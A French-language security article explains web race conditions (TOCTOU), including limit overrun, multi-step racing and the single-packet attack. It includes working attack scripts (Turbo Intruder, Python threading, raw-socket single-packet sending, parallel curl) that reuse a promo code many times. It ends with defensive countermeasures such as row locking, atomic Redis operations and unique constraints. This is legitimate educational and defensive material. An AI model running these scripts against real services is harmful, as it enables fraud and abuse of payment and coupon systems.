---
title: Race Conditions
domain: sciences-appliquées
subdomain: informatique / sécurité / web
tags: [race-condition, toctou, concurrence, web, bug-bounty, sécurité]
date: 2026-03-22
---

# Race Conditions

Une race condition (ou TOCTOU — Time Of Check / Time Of Use) survient quand un système effectue plusieurs opérations en supposant qu'elles sont séquentielles, alors qu'elles peuvent être exécutées simultanément. En sécurité web, elles permettent souvent de contourner des vérifications métier ou des limites de ressources.

## Principe fondamental

```
Opération normale (séquentielle) :
[Vérifier solde] → [Débiter] → [Transférer]

Attaque (parallèle) :
Thread 1 : [Vérifier solde ✓] → ... → [Débiter]
Thread 2 : [Vérifier solde ✓] → ... → [Débiter]
                     ↑
              Les deux lisent le solde avant que l'un des deux débite
              → Double débit possible
```

## Types de race conditions web

### 1. Limit overrun (le plus courant)

Contourner une limite censée n'être franchie qu'une fois.

```
Exemples :
- Utiliser un code promo une seule fois → envoyer 10 requêtes simultanées
- Retirer plus que son solde disponible
- Racheter un article en stock limité plusieurs fois
- Utiliser un token de reset password plusieurs fois
- Activer un compte d'essai gratuit plusieurs fois
```

**Démonstration — code promo :**
```python
# Côté serveur vulnérable
def apply_promo(user_id, promo_code):
    promo = db.get_promo(promo_code)

    # RACE CONDITION : vérification et marquage non atomiques
    if promo.already_used_by(user_id):    # Vérification
        return "Déjà utilisé"

    # Fenêtre de vulnérabilité ici ← deux threads peuvent passer simultanément
    time.sleep(0.1)  # Simulé — en réalité c'est la latence DB

    promo.mark_used(user_id)              # Marquage
    user.apply_discount(promo.discount)
    return "Promo appliquée"
```

### 2. Multi-step sequence racing

Exploiter la fenêtre entre deux étapes d'un processus multi-étapes.

```
Exemple : Transfert de fonds avec vérification en deux étapes
Step 1 : POST /transfer/initiate → génère un transfer_id
Step 2 : POST /transfer/confirm/{transfer_id}

Attack : initier 1 transfert, confirmer 10 fois simultanément
→ Si la vérification du statut n'est pas atomique → exécution multiple
```

### 3. Single-packet attack (Burp Suite 2023)

Technique de James Kettle (PortSwigger) qui élimine le jitter réseau en envoyant toutes les requêtes dans un seul paquet TCP.

```
Problème classique : les requêtes n'arrivent pas exactement au même moment
(réseau, buffering, OS scheduling)

Solution HTTP/2 : multiplexer plusieurs requêtes dans un seul paquet TCP
→ Le serveur les reçoit et les traite véritablement simultanément
→ Fenêtre de race condition maximisée
```

## Exploitation avec Turbo Intruder (Burp Suite)

```python
# Script Turbo Intruder — race condition sur code promo
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=20,
                           requestsPerConnection=1,
                           pipeline=False)

    # Préparer et envoyer 20 requêtes simultanément
    for i in range(20):
        engine.queue(target.req, gate='race1')

    engine.openGate('race1')  # Toutes les requêtes partent en même temps

def handleResponse(req, interesting):
    if '200' in req.status:
        table.add(req)
```

```python
# Script Python simple avec threading
import requests
import threading

def use_promo(session, promo_code):
    r = session.post("https://site.com/promo",
                     json={"code": promo_code},
                     headers={"Authorization": f"Bearer {TOKEN}"})
    print(f"Thread {threading.current_thread().name}: {r.status_code} - {r.text[:100]}")

# Créer une session avec cookies d'auth
session = requests.Session()
session.cookies.set("session", SESSION_COOKIE)

# Lancer 15 threads simultanément
threads = [threading.Thread(target=use_promo, args=(session, "PROMO50"))
           for _ in range(15)]
[t.start() for t in threads]
[t.join() for t in threads]
```

## Single-packet attack avec Python

```python
import socket
import ssl

def single_packet_attack(host, port, requests_list):
    """Envoie plusieurs requêtes HTTP/1.1 dans un seul paquet TCP"""

    # Préparer toutes les requêtes sauf la dernière
    # (envoyer la dernière déclenche le traitement)
    payload = b""
    for req in requests_list[:-1]:
        payload += req.encode() + b"\r\n\r\n"

    # Connexion
    sock = socket.create_connection((host, port))
    if port == 443:
        context = ssl.create_default_context()
        sock = context.wrap_socket(sock, server_hostname=host)

    # Envoyer tout sauf la dernière requête
    sock.send(payload)

    # Envoyer la dernière requête pour déclencher le traitement simultané
    sock.send(requests_list[-1].encode() + b"\r\n\r\n")

    # Lire les réponses
    responses = []
    while True:
        data = sock.recv(4096)
        if not data:
            break
        responses.append(data.decode())

    return responses
```

## Détection

```bash
# Chercher les endpoints sensibles aux limits
# Points à tester en priorité :
# - Codes promo / coupons
# - Systèmes de vote (un vote par utilisateur)
# - Systèmes de parrainage
# - Paiements et remboursements
# - Téléchargements limités
# - API rate limits

# Test rapide avec curl en parallèle
for i in {1..10}; do
    curl -s -o /dev/null -w "%{http_code}\n" \
         -X POST "https://site.com/redeem" \
         -H "Authorization: Bearer $TOKEN" \
         -d '{"code":"PROMO10"}' &
done
wait
```

## Contre-mesures

### Verrou de base de données (SELECT FOR UPDATE)

```sql
-- PostgreSQL — transaction atomique avec verrou
BEGIN;
SELECT * FROM promos
WHERE code = 'PROMO10' AND used_by IS NULL
FOR UPDATE;  -- Verrou exclusif → les autres transactions attendent

-- Si la ligne est disponible
UPDATE promos SET used_by = 42, used_at = NOW()
WHERE code = 'PROMO10';

COMMIT;
-- À la fin : le verrou est libéré, les autres transactions voient "already used"
```

### Opérations atomiques (Redis)

```python
import redis

r = redis.Redis()

def use_promo_atomic(user_id, promo_code):
    key = f"promo:{promo_code}:used_by"

    # SETNX (SET if Not eXists) — atomique par définition Redis
    acquired = r.setnx(key, user_id)

    if not acquired:
        return "Déjà utilisé"

    r.expire(key, 86400)  # TTL de sécurité
    apply_discount(user_id, promo_code)
    return "Promo appliquée"
```

### Idempotency keys

```python
# Chaque requête sensible reçoit une clé unique (générée côté client)
POST /transfer
{
    "amount": 100,
    "idempotency_key": "uuid-v4-unique-par-requete"
}

# Côté serveur : stocker la clé → les requêtes dupliquées retournent le même résultat
# sans ré-exécuter l'opération
```

### Constraint de base de données

```sql
-- Contrainte UNIQUE → une seule ligne possible par (user_id, promo_code)
ALTER TABLE promo_uses
ADD CONSTRAINT unique_user_promo UNIQUE (user_id, promo_code);

-- Si deux transactions insèrent simultanément → l'une obtiendra une erreur de contrainte
-- Capturer l'exception et retourner "Déjà utilisé"
```
